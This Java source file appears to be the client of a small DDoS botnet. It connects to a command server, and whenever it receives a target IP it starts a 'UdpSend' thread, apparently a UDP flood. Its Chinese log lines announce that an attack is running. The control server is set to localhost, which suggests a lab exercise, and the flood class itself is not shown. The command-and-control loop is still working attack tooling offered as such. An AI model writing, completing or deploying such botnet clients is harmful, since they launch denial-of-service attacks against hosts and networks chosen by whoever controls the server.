package com.zhanyingwl.www;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

public class doConnect {
    static String ServerName = "localhost";
    static int ServerPort = 8090;
    static String getTargetHost;

    public static void main(String[] args) {
        while (true) {
            try {
                InetAddress address = InetAddress.getByName(ServerName);
                String hostIPAddress = address.getHostAddress(); // DNS解析到控制端服务器IP地址
                if (hostIPAddress.equals("127.0.0.1")) {
                    System.out.println("解析成功！主控端认证地址为 " + hostIPAddress + " ，客户端开始请求建立连接！");
                    Socket socket = new Socket(ServerName, ServerPort);
                    while (true) {
                        Thread.sleep(1000);
                        InputStream is = socket.getInputStream();
                        BufferedReader br = new BufferedReader(new InputStreamReader(is));
                        getTargetHost = br.readLine();
                        switch (getTargetHost) {
                            case "none":
                                System.out.println("没啥事儿！");
                                System.out.println("GO！");
                                System.out.println("--------------------------------------");
                                break;
                            default:
                                System.out.println("客户端接收到目标IP：" + getTargetHost);
                                UdpSend udpSend = new UdpSend();
                                udpSend.start();
                                for (int i = 0; i < 10; i++) {
                                    Thread.sleep(1000);
                                    System.out.println("执行攻击中。。。");
                                }
                                udpSend.interrupt();
                        }
                    }
                } else {
                    System.out.println("系统错误！");
                }
            } catch (InterruptedException | IOException e) {
                e.printStackTrace();
            }
        }
    }
}